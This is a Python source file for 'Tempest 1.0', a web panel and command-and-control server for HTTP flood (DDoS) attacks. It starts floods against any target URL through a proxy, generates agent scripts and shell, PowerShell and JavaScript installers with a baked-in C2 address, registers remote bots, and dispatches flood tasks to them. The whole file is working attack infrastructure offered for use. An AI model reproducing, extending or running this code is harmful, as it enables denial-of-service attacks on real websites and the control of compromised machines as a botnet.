#!/usr/bin/env python3
"""
Tempest 1.0 — All-in-one server
=========================================
python3 server.py          → http://localhost:5000

API
  GET  /api/proxy-status   check Squid TCP reachability
  GET  /api/config         get current proxy config
  POST /api/config         update proxy config { host, port }
  POST /api/start          start flood { target, method, workers, rps, duration }
  POST /api/stop           graceful stop
  GET  /api/stream         Server-Sent Events (live metrics)
  GET  /api/bots           list registered bots
  POST /api/bots/register  register a bot { id, ip, label }
  POST /api/bots/remove    remove a bot { id }

Pure stdlib — no pip installs required.
"""

import os
import sys
import json
import time
import queue
import threading
import mimetypes
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import engine as eng

PORT   = int(os.environ.get("PORT", "5000"))
PUBLIC = os.path.join(HERE, "public")

# ── Mutable proxy config (can be updated at runtime via /api/config) ──────────
_config_lock = threading.Lock()
_config = {
    "proxy_host": eng.PROXY_HOST,
    "proxy_port": eng.PROXY_PORT,
}

def _apply_config(host, port):
    """Update engine proxy settings at runtime."""
    with _config_lock:
        _config["proxy_host"] = host
        _config["proxy_port"] = port
    eng.PROXY_HOST = host
    eng.PROXY_PORT = port
    eng.PROXY_URL  = "http://{}:{}".format(host, port)
    # Rebuild shared opener
    eng.OPENER = eng.build_opener()

# ── Agent / Bot registry ──────────────────────────────────────────────────────
_bots_lock  = threading.Lock()
_bots       = {}   # id -> { id, ip, hostname, platform, label, registered_at, last_seen, status }

# Agent task queue: id -> pending task dict (or None)
_tasks_lock = threading.Lock()
_tasks      = {}   # agent_id -> task dict | None

# Agent results log
_results_lock = threading.Lock()
_results      = []   # list of result dicts (last 200)

AGENT_TEMPLATE    = os.path.join(HERE, "agent", "agent_template.py")
INSTALL_SH        = os.path.join(HERE, "agent", "install_template.sh")
INSTALL_PS1       = os.path.join(HERE, "agent", "install_template.ps1")
INSTALL_JS        = os.path.join(HERE, "agent", "install_template.js")

# ── Shared SSE / flood state ──────────────────────────────────────────────────
_lock         = threading.Lock()
_sse_clients  = []
_flood_thread = None

_live = {
    "total": 0, "success": 0, "errors": 0,
    "latencies": [], "status_counts": {},
    "wall_start": None, "target": "", "method": "",
}

# ── Broadcast ─────────────────────────────────────────────────────────────────
def _broadcast(obj):
    msg = "data: {}\n\n".format(json.dumps(obj))
    with _lock:
        dead = []
        for q in _sse_clients:
            try:
                q.put_nowait(msg)
            except Exception:
                dead.append(q)
        for q in dead:
            if q in _sse_clients:
                _sse_clients.remove(q)

# ── Ticker ────────────────────────────────────────────────────────────────────
_ticker_stop = threading.Event()

def _ticker():
    while not _ticker_stop.is_set():
        time.sleep(0.5)
        with _lock:
            s    = dict(_live)
            lats = sorted(s["latencies"])
        if s["wall_start"] is None:
            continue
        p50 = lats[int(len(lats)*0.50)] if lats else 0
        p99 = lats[int(len(lats)*0.99)] if lats else 0
        _broadcast({
            "type":          "tick",
            "total":         s["total"],
            "success":       s["success"],
            "errors":        s["errors"],
            "p50":           round(p50, 1),
            "p99":           round(p99, 1),
            "status_counts": s["status_counts"],
        })

# ── on_result callback ────────────────────────────────────────────────────────
def _on_result(ok_flag, ms, status):
    with _lock:
        _live["total"] += 1
        if ok_flag:
            _live["success"] += 1
        else:
            _live["errors"]  += 1
        if ms > 0:
            _live["latencies"].append(ms)
        sc = str(status) if status else "0"
        _live["status_counts"][sc] = _live["status_counts"].get(sc, 0) + 1

# ── Flood runner ──────────────────────────────────────────────────────────────
def _run_flood(target, method, workers, rps, duration):
    with _lock:
        _live.update({
            "total": 0, "success": 0, "errors": 0,
            "latencies": [], "status_counts": {},
            "wall_start": time.time(),
            "target": target, "method": method,
        })

    eng._STOP.clear()
    _ticker_stop.clear()
    tick_t = threading.Thread(target=_ticker, daemon=True)
    tick_t.start()

    _broadcast({"type": "log", "level": "info",
                "msg": "Starting {} flood -> {}".format(method, target)})
    _broadcast({"type": "log", "level": "info",
                "msg": "Workers: {}  RPS: {}  Duration: {}s".format(workers, rps, duration)})

    try:
        if method == "MULTI":
            result = eng.run_multi_vector(
                target_url=target, workers=workers,
                rps=rps, duration=duration, on_result=_on_result,
            )
        else:
            result = eng.run_flood(
                target_url=target, workers=workers, rps=rps,
                duration=duration, method=method, on_result=_on_result,
            )
    except Exception as exc:
        _broadcast({"type": "log", "level": "error",
                    "msg": "Flood error: {}".format(exc)})
        result = {"total":0,"success":0,"errors":0,"wall":0,
                  "rps_actual":0,"p50":0,"p99":0,"status_counts":{}}
    finally:
        _ticker_stop.set()

    with _lock:
        lats = sorted(_live["latencies"])
        sc   = dict(_live["status_counts"])
        _live["wall_start"] = None

    p50 = lats[int(len(lats)*0.50)] if lats else 0
    p99 = lats[int(len(lats)*0.99)] if lats else 0
    stopped = eng._STOP.is_set()

    _broadcast({
        "type":          "done",
        "method":        result.get("method", method),
        "target":        target,
        "total":         result.get("total", 0),
        "success":       result.get("success", 0),
        "errors":        result.get("errors", 0),
        "rps_actual":    round(result.get("rps_actual", 0), 1),
        "wall":          round(result.get("wall", 0), 2),
        "p50":           round(p50, 1),
        "p99":           round(p99, 1),
        "status_counts": sc,
        "stopped_early": stopped,
    })
    _broadcast({"type": "log", "level": "success",
                "msg": "{} — {:,} sent  {:.1f} RPS  p99 {:.0f}ms".format(
                    "Stopped" if stopped else "Complete",
                    result.get("total", 0),
                    result.get("rps_actual", 0),
                    p99)})

# ── HTTP Handler ──────────────────────────────────────────────────────────────
class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):  # noqa: A002
        pass

    def _cors(self):
        self.send_header("Access-Control-Allow-Origin",  "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")

    def do_OPTIONS(self):
        self.send_response(204)
        self._cors()
        self.end_headers()

    def do_GET(self):
        parsed = urlparse(self.path)
        path   = parsed.path.rstrip("/") or "/"

        if path == "/api/proxy-status":
            ok, ms = eng.check_proxy_reachability()
            with _config_lock:
                cfg = dict(_config)
            self._json({"ok": ok, "ms": ms,
                        "host": cfg["proxy_host"], "port": cfg["proxy_port"]})
            return

        if path == "/api/config":
            with _config_lock:
                self._json(dict(_config))
            return

        if path == "/api/stream":
            self.send_response(200)
            self._cors()
            self.send_header("Content-Type",    "text/event-stream")
            self.send_header("Cache-Control",   "no-cache")
            self.send_header("X-Accel-Buffering","no")
            self.end_headers()
            q = queue.Queue()
            with _lock:
                _sse_clients.append(q)
            try:
                while True:
                    try:
                        msg = q.get(timeout=15)
                        self.wfile.write(msg.encode())
                        self.wfile.flush()
                    except queue.Empty:
                        self.wfile.write(b": heartbeat\n\n")
                        self.wfile.flush()
            except Exception:
                pass
            finally:
                with _lock:
                    if q in _sse_clients:
                        _sse_clients.remove(q)
            return

        if path == "/api/bots":
            with _bots_lock:
                self._json({"bots": list(_bots.values())})
            return

        # ── Agent API ─────────────────────────────────────────────────────────
        if path == "/api/agent/generate":
            # Generate agent script with baked-in C2 address
            qs     = parsed.query  # e.g. host=1.2.3.4&port=5000
            params = {}
            for part in qs.split("&"):
                if "=" in part:
                    k, v = part.split("=", 1)
                    params[k] = v
            c2_host = params.get("host", "").strip()
            c2_port = params.get("port", str(PORT)).strip()
            if not c2_host:
                self._json({"ok": False, "error": "host param required"})
                return
            try:
                with open(AGENT_TEMPLATE, "r") as f:
                    src = f.read()
            except Exception as e:
                self._json({"ok": False, "error": str(e)})
                return
            src = src.replace("__C2_HOST__", c2_host).replace("__C2_PORT__", c2_port)
            data_out = src.encode()
            filename = "agent_{}.py".format(c2_host.replace(".", "_"))
            self.send_response(200)
            self._cors()
            self.send_header("Content-Type",        "text/plain; charset=utf-8")
            self.send_header("Content-Disposition", 'attachment; filename="{}"'.format(filename))
            self.send_header("Content-Length",      str(len(data_out)))
            self.end_headers()
            self._safe_write(data_out)
            return

        if path == "/api/agent/task":
            qs     = parsed.query
            params = {}
            for part in qs.split("&"):
                if "=" in part:
                    k, v = part.split("=", 1)
                    params[k] = v
            agent_id = params.get("id", "").strip()
            with _tasks_lock:
                task = _tasks.pop(agent_id, None)
            # Also check global stop flag
            if eng._STOP.is_set():
                self._json({"task": None, "stop": True})
            else:
                self._json({"task": task, "stop": False})
            return

        if path == "/api/agent/results":
            with _results_lock:
                self._json({"results": list(_results)})
            return

        # ── Live per-agent metrics (aggregated from last ping) ────────────────
        if path == "/api/agent/metrics":
            with _bots_lock:
                metrics_list = []
                for bot in _bots.values():
                    m = bot.get("live_metrics", {})
                    metrics_list.append({
                        "agent_id":        bot["id"],
                        "hostname":        bot.get("hostname", "-"),
                        "ip":              bot.get("ip", "-"),
                        "last_seen":       bot.get("last_seen", 0),
                        "flood_active":    m.get("flood_active", 0),
                        "rps_current":     m.get("rps_current", 0.0),
                        "requests_total":  m.get("requests_total", 0),
                        "requests_success":m.get("requests_success", 0),
                        "requests_errors": m.get("requests_errors", 0),
                        "latency_p50_ms":  m.get("latency_p50_ms", 0.0),
                        "latency_p99_ms":  m.get("latency_p99_ms", 0.0),
                        "flood_target":    m.get("flood_target", ""),
                        "flood_method":    m.get("flood_method", ""),
                    })
            self._json({"metrics": metrics_list})
            return

        # ── Universal JS installer ────────────────────────────────────────────
        if path == "/install.js":
            qs     = parsed.query
            params = {}
            for part in qs.split("&"):
                if "=" in part:
                    k, v = part.split("=", 1)
                    params[k] = v
            c2_host = params.get("host", "").strip()
            c2_port = params.get("port", str(PORT)).strip()
            try:
                with open(INSTALL_JS, "r") as f:
                    src = f.read()
            except Exception as e:
                self._json({"ok": False, "error": str(e)})
                return
            if c2_host:
                src = src.replace("__C2_HOST__", c2_host).replace("__C2_PORT__", c2_port)
            data_out = src.encode()
            self.send_response(200)
            self._cors()
            self.send_header("Content-Type",   "application/javascript; charset=utf-8")
            self.send_header("Content-Length", str(len(data_out)))
            self.end_headers()
            self._safe_write(data_out)
            return

        # ── Installer scripts ─────────────────────────────────────────────────
        if path in ("/install.sh", "/install.ps1"):
            qs     = parsed.query
            params = {}
            for part in qs.split("&"):
                if "=" in part:
                    k, v = part.split("=", 1)
                    params[k] = v
            c2_host = params.get("host", "").strip()
            c2_port = params.get("port", str(PORT)).strip()
            if not c2_host:
                # Serve raw template (browser preview)
                tpl_file = INSTALL_SH if path.endswith(".sh") else INSTALL_PS1
                try:
                    with open(tpl_file, "rb") as f:
                        raw = f.read()
                    self.send_response(200)
                    self._cors()
                    self.send_header("Content-Type",   "text/plain; charset=utf-8")
                    self.send_header("Content-Length", str(len(raw)))
                    self.end_headers()
                    self._safe_write(raw)
                except Exception as e:
                    self._json({"ok": False, "error": str(e)})
                return
            # Serve baked script
            tpl_file = INSTALL_SH if path.endswith(".sh") else INSTALL_PS1
            try:
                with open(tpl_file, "r") as f:
                    src = f.read()
            except Exception as e:
                self._json({"ok": False, "error": str(e)})
                return
            src = src.replace("__C2_HOST__", c2_host).replace("__C2_PORT__", c2_port)
            data_out = src.encode()
            fname    = "install.sh" if path.endswith(".sh") else "install.ps1"
            mime     = "text/x-sh" if path.endswith(".sh") else "text/plain"
            self.send_response(200)
            self._cors()
            self.send_header("Content-Type",        mime + "; charset=utf-8")
            self.send_header("Content-Disposition", 'attachment; filename="{}"'.format(fname))
            self.send_header("Content-Length",      str(len(data_out)))
            self.end_headers()
            self._safe_write(data_out)
            return

        # Static files
        if path == "/":
            path = "/index.html"
        file_path = os.path.join(PUBLIC, path.lstrip("/"))
        if os.path.isfile(file_path):
            mime, _ = mimetypes.guess_type(file_path)
            with open(file_path, "rb") as f:
                data = f.read()
            self.send_response(200)
            self.send_header("Content-Type",   mime or "application/octet-stream")
            self.send_header("Content-Length", str(len(data)))
            self._cors()
            self.end_headers()
            self._safe_write(data)
        else:
            self.send_response(404)
            self.end_headers()
            self._safe_write(b"404 Not Found")

    def do_POST(self):
        global _flood_thread
        path   = urlparse(self.path).path
        length = int(self.headers.get("Content-Length", 0))
        body   = self.rfile.read(length) if length else b"{}"
        try:
            data = json.loads(body)
        except Exception:
            data = {}

        if path == "/api/config":
            host = str(data.get("host", "")).strip()
            port = int(data.get("port", 3128))
            if not host:
                self._json({"ok": False, "error": "host required"})
                return
            _apply_config(host, port)
            self._json({"ok": True, "host": host, "port": port})

        elif path == "/api/start":
            target      = (data.get("target") or "").strip()
            method      = (data.get("method") or "GET").upper()
            workers     = max(1,   int(data.get("workers", 50)))
            rps         = max(0.1, float(data.get("rps", 100)))
            duration    = max(1.0, float(data.get("duration", 30)))
            local_flood    = bool(data.get("local", True))    # run flood on this server
            bot_dispatch   = bool(data.get("bots", True))     # dispatch to agents
            selected_agents = data.get("agent_ids", None)     # None = all, list = specific IDs

            if not target:
                self._json({"ok": False, "error": "target is required"})
                return
            if not target.startswith("http://") and not target.startswith("https://"):
                target = "https://" + target
            valid = {"GET","POST","HEAD","PUT","PATCH","DELETE","OPTIONS","MULTI"}
            if method not in valid:
                self._json({"ok": False, "error": "invalid method"})
                return

            # Dispatch task to selected (or all) agents
            dispatched = 0
            if bot_dispatch:
                task_id = "{:.0f}".format(time.time())
                task_payload = {
                    "task_id":  task_id,
                    "target":   target,
                    "method":   method,
                    "workers":  workers,
                    "rps":      rps,
                    "duration": duration,
                }
                with _bots_lock:
                    all_ids = list(_bots.keys())
                # Filter to selected agents if provided, else use all
                if selected_agents and isinstance(selected_agents, list):
                    target_ids = [aid for aid in selected_agents if aid in all_ids]
                else:
                    target_ids = all_ids
                with _tasks_lock:
                    for aid in target_ids:
                        _tasks[aid] = dict(task_payload)
                        dispatched += 1
                if dispatched:
                    _broadcast({"type": "log", "level": "info",
                                "msg": "Task dispatched to {} agent(s)".format(dispatched)})

            # Run flood locally through proxy
            if local_flood:
                if _flood_thread and _flood_thread.is_alive():
                    self._json({"ok": False, "error": "flood already running on this server"})
                    return
                _flood_thread = threading.Thread(
                    target=_run_flood,
                    args=(target, method, workers, rps, duration),
                    daemon=True,
                )
                _flood_thread.start()

            self._json({"ok": True, "dispatched": dispatched, "local": local_flood})

        elif path == "/api/stop":
            eng._STOP.set()
            _ticker_stop.set()
            _broadcast({"type": "log", "level": "warning",
                        "msg": "Emergency stop received — draining in-flight requests..."})
            self._json({"ok": True})

        elif path == "/api/bots/register":
            bot_id    = str(data.get("id", "")).strip()
            bot_ip    = str(data.get("ip", "")).strip()
            bot_label = str(data.get("label", bot_id)).strip()
            if not bot_id or not bot_ip:
                self._json({"ok": False, "error": "id and ip required"})
                return
            now = time.time()
            with _bots_lock:
                _bots[bot_id] = {
                    "id":            bot_id,
                    "ip":            bot_ip,
                    "label":         bot_label,
                    "registered_at": now,
                    "last_seen":     now,
                }
            _broadcast({"type": "bot_update", "bots": list(_bots.values())})
            self._json({"ok": True})

        elif path == "/api/bots/remove":
            bot_id = str(data.get("id", "")).strip()
            with _bots_lock:
                removed = _bots.pop(bot_id, None)
            _broadcast({"type": "bot_update", "bots": list(_bots.values())})
            self._json({"ok": True, "removed": removed is not None})

        elif path == "/api/bots/ping":
            bot_id = str(data.get("id", "")).strip()
            with _bots_lock:
                if bot_id in _bots:
                    _bots[bot_id]["last_seen"] = time.time()
            self._json({"ok": True})

        # ── Agent endpoints (called by agent.py on remote devices) ────────────
        elif path == "/api/agent/register":
            aid      = str(data.get("id", "")).strip()
            hostname = str(data.get("hostname", "")).strip()
            platform = str(data.get("platform", "")).strip()
            ip       = str(data.get("ip", "")).strip()
            if not aid:
                self._json({"ok": False, "error": "id required"})
                return
            now = time.time()
            with _bots_lock:
                _bots[aid] = {
                    "id":            aid,
                    "ip":            ip,
                    "hostname":      hostname,
                    "platform":      platform,
                    "label":         hostname or aid,
                    "registered_at": now,
                    "last_seen":     now,
                }
            with _tasks_lock:
                if aid not in _tasks:
                    _tasks[aid] = None
            _broadcast({"type": "bot_update", "bots": list(_bots.values())})
            self._json({"ok": True})

        elif path == "/api/agent/ping":
            aid = str(data.get("id", "")).strip()
            live_metrics = data.get("metrics", {})
            with _bots_lock:
                if aid in _bots:
                    _bots[aid]["last_seen"] = time.time()
                    if live_metrics:
                        _bots[aid]["live_metrics"] = live_metrics
            # Embed stop signal in ping response so busy agents see it immediately
            self._json({"ok": True, "stop": eng._STOP.is_set()})

        elif path == "/api/agent/result":
            aid  = str(data.get("agent_id", "")).strip()
            entry = {
                "agent_id":   aid,
                "task_id":    data.get("task_id", ""),
                "total":      data.get("total", 0),
                "success":    data.get("success", 0),
                "errors":     data.get("errors", 0),
                "rps_actual": data.get("rps_actual", 0),
                "wall":       data.get("wall", 0),
                "ts":         time.time(),
            }
            with _results_lock:
                _results.insert(0, entry)
                if len(_results) > 200:
                    _results.pop()
            _broadcast({"type": "agent_result", "result": entry})
            self._json({"ok": True})

        else:
            self.send_response(404)
            self.end_headers()

    def _safe_write(self, data):
        try:
            self.wfile.write(data)
        except (BrokenPipeError, ConnectionResetError):
            pass

    def _json(self, obj, status=200):
        body = json.dumps(obj).encode()
        try:
            self.send_response(status)
            self._cors()
            self.send_header("Content-Type",   "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self._safe_write(body)
        except (BrokenPipeError, ConnectionResetError):
            pass


# ── Entry ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", PORT), Handler)
    print("=" * 56)
    print("  Tempest 1.0")
    print("  http://localhost:{}".format(PORT))
    print("  Proxy: {}:{}".format(eng.PROXY_HOST, eng.PROXY_PORT))
    print("=" * 56)
    print("  Override: L7_PROXY_HOST=x L7_PROXY_PORT=y python3 server.py")
    print("  Ctrl+C to stop\n")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down.")
        eng._STOP.set()
        server.shutdown()
